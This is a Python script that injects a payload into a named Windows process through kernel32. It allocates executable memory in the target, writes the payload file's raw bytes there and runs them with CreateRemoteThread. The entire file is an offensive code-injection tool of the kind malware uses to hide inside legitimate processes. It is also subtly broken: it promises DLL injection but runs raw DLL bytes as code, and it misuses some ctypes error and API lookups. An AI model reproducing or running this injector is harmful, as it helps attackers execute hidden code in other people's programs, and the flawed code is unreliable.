
import argparse
import ctypes
import sys

# Windows constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Windows APIs
kernel32 = ctypes.WinDLL('kernel32')

def get_pid_by_name(process_name):
    """Gets the PID of a process by its name."""
    pids = (ctypes.c_ulong * 1024)()
    cb = ctypes.sizeof(pids)
    bytes_returned = ctypes.c_ulong()
    if not kernel32.EnumProcesses(ctypes.byref(pids), cb, ctypes.byref(bytes_returned)):
        return None

    num_pids = bytes_returned.value // ctypes.sizeof(ctypes.c_ulong)
    for i in range(num_pids):
        pid = pids[i]
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if h_process:
            image_name = (ctypes.c_char * 260)()
            if kernel32.GetModuleBaseNameA(h_process, None, ctypes.byref(image_name), ctypes.sizeof(image_name)) > 0:
                if image_name.value.decode('utf-8') == process_name:
                    kernel32.CloseHandle(h_process)
                    return pid
            kernel32.CloseHandle(h_process)
    return None

def main():
    parser = argparse.ArgumentParser(description='Inject a DLL into a process.')
    parser.add_argument('--process', required=True, help='The name of the target process.')
    parser.add_argument('--payload', required=True, help='The path to the payload DLL.')
    args = parser.parse_args()

    pid = get_pid_by_name(args.process)
    if not pid:
        print(f'[-] Process "{args.process}" not found.')
        sys.exit(1)

    try:
        with open(args.payload, 'rb') as f:
            payload = f.read()
    except FileNotFoundError:
        print(f'[-] Payload file not found: {args.payload}')
        sys.exit(1)

    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print(f'[-] Failed to open process: {ctypes.get_last_error()}')
        sys.exit(1)

    remote_memory = kernel32.VirtualAllocEx(h_process, 0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not remote_memory:
        print(f'[-] Failed to allocate memory in remote process: {ctypes.get_last_error()}')
        kernel32.CloseHandle(h_process)
        sys.exit(1)

    if not kernel32.WriteProcessMemory(h_process, remote_memory, payload, len(payload), None):
        print(f'[-] Failed to write to remote process memory: {ctypes.get_last_error()}')
        kernel32.VirtualFreeEx(h_process, remote_memory, 0, 0x8000) # MEM_RELEASE
        kernel32.CloseHandle(h_process)
        sys.exit(1)

    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, remote_memory, None, 0, None)
    if not h_thread:
        print(f'[-] Failed to create remote thread: {ctypes.get_last_error()}')
        kernel32.VirtualFreeEx(h_process, remote_memory, 0, 0x8000) # MEM_RELEASE
        kernel32.CloseHandle(h_process)
        sys.exit(1)

    print(f'[+] Successfully injected payload into process {args.process} (PID: {pid})')

    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)

if __name__ == '__main__':
    main()
